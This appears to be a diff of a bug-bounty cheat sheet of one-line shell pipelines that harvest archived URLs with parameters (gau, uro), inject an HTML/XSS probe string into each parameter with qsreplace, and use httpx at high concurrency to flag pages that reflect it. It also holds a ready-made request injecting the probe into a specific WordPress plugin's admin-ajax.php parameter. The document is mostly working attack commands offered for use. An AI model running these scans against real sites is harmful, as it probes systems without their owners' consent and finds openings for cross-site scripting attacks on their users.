@@ -16,15 +16,17 @@
 ## gau+uro+httpx(My Xss)
      cat domains.txt | gau --blacklist 3dm,3ds,3gp,7z,aac,ai,aif,apk,avi,bat,bin,BMP,bz2,cfg,class,CR2,csh,css,csv,dat,deb,dmg,doc,docx,dwg,eot,EPS,exe,EXIF,flac,flv,gba,gdb,gif,gz,HEIC,hqx,ICO,ico,ics,iso,jar,jpeg,jpg,js,json,lua,m4a,m4v,mov,mp3,mp4,msi,NEF,nes,nrg,odp,ods,odt,ogg,ogv,otf,PBM,pdf,PGM,pkg,plist,png,PPM,ppt,pptx,ps,PSD,RAW,rb,rpm,rtf,srt,SVG,svg,swf,sys,tar,TGA,TIFF,ttf,txt,vob,wav,WEBP,webp,woff,woff2,xls,xlsx,xml,xpi,yaml,z64,z7,zip --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp --o domain4xss.txt
 
-     uro < domains.txt | grep -E 'https?://[^?]+\?[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*' | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E > domain4httpx.txt
+     cat domains.txt | uro --filter hasparams | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E > domain4httpx.txt
 
      cat domain4httpx.txt | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
 
-    #Note: have a server? use:
+    #Note: have a server ? use:
     cat domains.txt | gau --providers wayback,commoncrawl,otx,urlscan --mt text/html,application/xhtml+xml,application/xml,application/xml+html,application/vnd.wap.xhtml+xml,application/xhtml+xml,text/xml --subs --fp | uro | grep -E 'https?://[^?]+\?[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*' | qsreplace %22%3E%3Ch1%3EAkira%3C%2Fh1%3E | httpx -ms "<h1>Akira</h1>" -ct -t 200 -o bounty.txt
    
    ### oneLine:
-       cat Domains.txt | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | uro | httpx -o domain4xss.txt
+    cat Domains.txt | gau | gf xss | sed "s/=.*/=/" | sed "s/URL: //" | uro | httpx -o domain4xss.txt
+
+    cat params.js [.py|.go|paramspider.py] | uro --filter hasparams -b jpg png js json pdf txt -o 4xss.txt
 
 ## wordpressXss:
     cat domain.txt | httpx -path "/wp-admin/admin-ajax.php?action=ptp_design4_color_columns&post_id=1&column_names=%3Ch1%3EAkira%3C/h1%3E" -ms "<h1>Akira</h1>" -fe "Location: .*<h1>Akira</h1>.*" -t 200 -mc 200
